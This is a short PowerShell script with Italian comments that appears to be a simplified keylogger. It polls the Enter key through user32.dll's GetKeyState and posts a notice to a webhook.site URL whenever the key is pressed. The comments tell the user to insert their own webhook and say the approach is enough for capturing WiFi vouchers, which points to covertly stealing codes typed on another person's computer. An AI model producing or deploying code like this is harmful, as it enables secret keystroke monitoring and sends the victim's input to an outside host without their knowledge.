# Sostituisci l'URL sotto con il tuo link di webhook.site
$webhook = "https://webhook.site/ee3b30c1-701d-4d7e-9d40-ecf0c88a8006"

# Questa funzione cattura i tasti (semplificata per PowerShell)
# Nota: PowerShell non è veloce come il C++, ma per i voucher WiFi basta
$code = @'
[DllImport("user32.dll")]
public static extern short GetKeyState(int keyCode);
'@
Add-Type -MemberDefinition $code -Name 'KeyState' -Namespace 'Win32'

while($true) {
    # Esempio: cattura se viene premuto INVIO (codice 13)
    if ([Win32.KeyState]::GetKeyState(13) -band 0x8000) {
        Invoke-RestMethod -Uri $webhook -Method Post -Body "Tasto Invio premuto"
        Start-Sleep -Milliseconds 500
    }
    Start-Sleep -Milliseconds 100
}